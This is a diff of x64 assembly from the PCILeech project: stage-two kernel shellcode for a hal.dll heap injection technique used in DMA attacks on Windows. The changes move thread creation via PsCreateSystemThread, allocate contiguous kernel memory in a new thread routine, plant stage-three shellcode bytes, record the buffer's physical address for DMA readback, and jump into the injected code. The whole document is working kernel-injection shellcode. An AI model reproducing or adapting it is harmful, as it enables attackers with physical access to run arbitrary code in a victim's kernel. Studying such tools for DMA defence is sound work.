@@ -1,6 +1,6 @@
 ; wx64_stage2.asm : assembly modified for the hal.dll heap injection technique.
 ;
-; (c) Ulf Frisk, 2016
+; (c) Ulf Frisk, 2016, 2017
 ; Author: Ulf Frisk, pcileech@frizk.net
 ;
 
@@ -13,9 +13,10 @@ main PROC
 	JMP main_start 
 	data_cmpxchg_flag		db 00h
 	data_filler				db 00h
-	data_phys_addr_alloc	dd 00000000h						; 4 bytes offset (4 bytes long)
-	data_orig_fnptr			dq 0000000000000000h				; 8 bytes offset (8 bytes long)
-	data_orig_fnptraddr		dq 0000000000000000h				; 16 bytes offset (8 bytes long)
+	data_phys_addr_alloc	dd 00000000h						; 04h byte offset (4 bytes long)
+	data_orig_fnptr			dq 0000000000000000h				; 08h byte offset (8 bytes long)
+	data_orig_fnptraddr		dq 0000000000000000h				; 10h byte offset (8 bytes long)
+	data_thread_handle		dq 0								; 18h byte offset (8 bytes long)
 	; ----------------------------------------------------
 	; SAVE ORIGINAL PARAMETERS
 	; ----------------------------------------------------
@@ -31,15 +32,15 @@ main PROC
 	PUSH r11
 	PUSH r12
 	PUSH r13
+	SUB rsp, 020h
 	; ----------------------------------------------------
 	; r12 = ntos base address
-	; r13 = memory address of allocated buffer
+	; r13 = PsCreateSystemThread address
 	; ----------------------------------------------------
 	; SET UP STACK AND PARAMETERS
 	; param0 = address of NTOS code. First entry of
 	; IDT table = division by zero points into NTOSKRNL
 	; ----------------------------------------------------
-	SUB rsp, 020h
 	SIDT [rsp]
 	MOV rcx, [rsp+2]       
 	MOV rcx, [rcx+4]                ; param0
@@ -71,10 +72,58 @@ main PROC
 	MOV rcx, [data_orig_fnptr]
 	MOV [rax], rcx
 	; ----------------------------------------------------
+	; CREATE THREAD
+	; ----------------------------------------------------
+	MOV rcx, r12
+	MOV edx, 94a06b02h			; H_PsCreateSystemThread
+	CALL PEGetProcAddressH
+	MOV r13, rax				; PsCreateSystemThread address
+	PUSH 0						; (dummy for stack alignment)
+	PUSH r12					; StartContext
+	LEA rax, setup2
+	PUSH rax					; StartRoutine
+	PUSH 0						; ClientId
+	SUB rsp, 020h				; (stack shadow space)
+	XOR r9, r9					; ProcessHandle
+	XOR r8, r8					; ObjectAttributes
+	MOV rdx, 1fffffh			; DesiredAccess
+	LEA rcx, data_thread_handle	; ThreadHandle
+	CALL r13
+	ADD rsp, 040h
+	; ----------------------------------------------------
+	; EXIT - RESTORE AND JMP BACK
+	; ----------------------------------------------------
+	skipcall:
+	ADD rsp, 020h
+	POP r13
+	POP r12
+	POP r11
+	POP r10
+	POP rdi
+	POP rsi
+	POP rbx
+	POP r9
+	POP r8
+	POP rdx
+	POP rcx
+	MOV rax, [data_orig_fnptr]
+	JMP rax
+main ENDP
+
+; ----------------------------------------------------
+; New Thread entry point. Allocate memory, write pre-stage3 code and write back
+; the physical address so PCILeech may read it with DMA.
+; rcx -> virtual address base of kernel
+; r12 :: virtual address base of kernel
+; r13 :: virtual address buffer
+; ----------------------------------------------------
+setup2 PROC
+	MOV al, 2					; DEBUG
+	MOV [data_filler], al		; DEBUG
+	; ----------------------------------------------------
 	; ALLOCATE 0x2000 CONTIGUOUS MEMORY BELOW 0x7fffffff
 	; ----------------------------------------------------
-	MOV [data_filler], 0dh		; DEBUG
-	MOV rcx, r12
+	MOV r12, rcx
 	MOV edx, 9f361ebch			; H_MmAllocateContiguousMemory
 	CALL PEGetProcAddressH
 	MOV rcx, 2000h
@@ -93,35 +142,15 @@ main PROC
 	; ----------------------------------------------------
 	; SET UP INITIAL STAGE3 SHELLCODE AND DATA
 	; ----------------------------------------------------
-	MOV [r13+8], r12
+	MOV rax, r12
+	MOV [r13+8], rax
 	MOV rax, 048FFFFFFF1058D48h
 	MOV [r13+1000h], rax
 	MOV rax, 0F07400F88348008Bh
 	MOV [r13+1008h], rax
 	; ----------------------------------------------------
-	; CREATE THREAD
+	; WRITE PHYSICAL MEMORY ADDRESS
 	; ----------------------------------------------------
-	MOV [data_filler], 0bh		; DEBUG
-	PUSH 0						; maintain stack alignment
-	PUSH r13
-	MOV eax, 1000h
-	ADD rax, r13
-	PUSH rax
-	PUSH 0
-	SUB rsp, 020h
-	MOV rcx, r12
-	MOV edx, 94a06b02h			; H_PsCreateSystemThread
-	CALL PEGetProcAddressH
-	MOV rcx, r13
-	MOV rdx, 1fffffh
-	XOR r8, r8
-	XOR r9, r9
-	CALL rax
-	ADD rsp, 040h
-	; ----------------------------------------------------
-	; RETRIEVE AND SET PHYSICAL ADDRESS
-	; ----------------------------------------------------
-	MOV [data_filler], 09h		; DEBUG
 	MOV rcx, r12
 	MOV edx, 5a326357h			; H_MmGetPhysicalAddress
 	CALL PEGetProcAddressH	
@@ -129,25 +158,11 @@ main PROC
 	CALL rax
 	MOV [data_phys_addr_alloc], eax
 	; ----------------------------------------------------
-	; EXIT - RESTORE AND JMP BACK
+	; JMP INTO ALLOCATED AREA
 	; ----------------------------------------------------
-	MOV [data_filler], 08h		; DEBUG
-	skipcall:
-	ADD rsp, 020h
-	POP r13
-	POP r12
-	POP r11
-	POP r10
-	POP rdi
-	POP rsi
-	POP rbx
-	POP r9
-	POP r8
-	POP rdx
-	POP rcx
-	MOV rax, [data_orig_fnptr]
-	JMP rax
-main ENDP
+	ADD r13, 1000h
+	JMP r13
+setup2 ENDP
 
 ; ----------------------------------------------------
 ; Perform ROR13 hashing
